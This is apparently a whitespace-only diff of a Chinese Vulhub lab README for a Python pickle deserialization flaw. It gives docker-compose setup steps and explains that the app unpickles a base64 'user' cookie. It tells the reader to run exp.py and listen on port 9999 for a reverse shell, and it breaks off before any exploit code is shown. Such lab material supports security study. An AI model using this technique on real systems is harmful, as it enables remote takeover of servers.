@@ -9,20 +9,20 @@
 
 ## 环境搭建
 
-Vulhub编译及运行测试环境：
+Vulhub 编译及运行测试环境：
 
 ```
 docker-compose build
 docker-compose up -d
 ```
 
-访问`http://your-ip:8000`，显示`Hello {username}!`。
+访问 `http://your-ip:8000`，显示 `Hello {username}!`。
 
 ## 漏洞复现
 
-username是取Cookie变量user，对其进行base64解码+反序列化后还原的对象中的“username”变量，默认为“Guest”，伪代码：`pickle_decode(base64_decode(cookie['user']))['username'] or 'Guest'`。
+username 是取 Cookie 变量 user，对其进行 base64 解码 + 反序列化后还原的对象中的“username”变量，默认为“Guest”，伪代码：`pickle_decode(base64_decode(cookie['user']))['username'] or 'Guest'`。
 
-调用exp.py，监听9999端口，反弹shell：
+调用 exp.py，监听 9999 端口，反弹 shell：
 
 ```python
 #!/usr/bin/env python3
